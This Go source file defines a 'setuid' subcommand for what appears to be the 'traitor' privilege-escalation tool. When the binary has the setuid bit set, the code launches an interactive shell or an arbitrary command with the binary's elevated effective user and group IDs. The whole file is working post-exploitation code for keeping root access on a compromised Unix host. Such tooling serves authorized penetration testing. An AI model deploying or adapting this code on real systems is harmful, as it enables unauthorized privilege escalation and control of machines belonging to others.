package cmd

import (
	"fmt"
	"os"
	"os/exec"
	"syscall"
	"time"

	"github.com/spf13/cobra"
)

var setuidShell = "/bin/sh"
var setuidShellCmd = ""

func init() {
	setuidCmd.Flags().StringVarP(&setuidShell, "shell", "s", setuidShell, "Path to shell to execute, e.g. /bin/bash.")
	setuidCmd.Flags().StringVarP(&setuidShellCmd, "cmd", "c", setuidShellCmd, "Shell command to execute - leave blank to be dropped in interactive shell.")
	rootCmd.AddCommand(setuidCmd)
}

var setuidCmd = &cobra.Command{
	Use:   "setuid",
	Short: "Wrap a given shell with setuid",
	Run: func(cmd *cobra.Command, args []string) {

		path, err := os.Executable()
		if err != nil {
			fail("Error requesting binary path: %s", err)
		}

		stat, err := os.Stat(path)
		if err != nil {
			fail("Error requesting binary stat: %s", err)
		}

		if stat.Mode()&os.ModeSetuid == 0 {
			fail("Error: the traitor binary does not have the setuid bit set: %o", stat.Mode())
		}

		effectiveUID := syscall.Geteuid()
		effectiveGID := syscall.Getegid()

		shellCmd := &exec.Cmd{
			SysProcAttr: &syscall.SysProcAttr{
				Credential: &syscall.Credential{
					Uid: uint32(effectiveUID),
					Gid: uint32(effectiveGID),
				},
			},
			Path:   setuidShell,
			Args:   []string{setuidShell},
			Env:    os.Environ(),
			Dir:    "/",
			Stdin:  os.Stdin,
			Stdout: os.Stdout,
			Stderr: os.Stderr,
		}

		if setuidShellCmd != "" {
			shellCmd.Args = append(shellCmd.Args, "-c", setuidShellCmd)
		} else {
			time.Sleep(time.Second)
			fmt.Println("")
			defer func() { fmt.Println("") }()
		}

		if err := shellCmd.Run(); err != nil {
			fail("Error: %s", err)
		}
	},
}

func fail(format string, args ...interface{}) {
	_, _ = fmt.Fprintf(os.Stderr, format+"\n", args...)
	os.Exit(1)
}
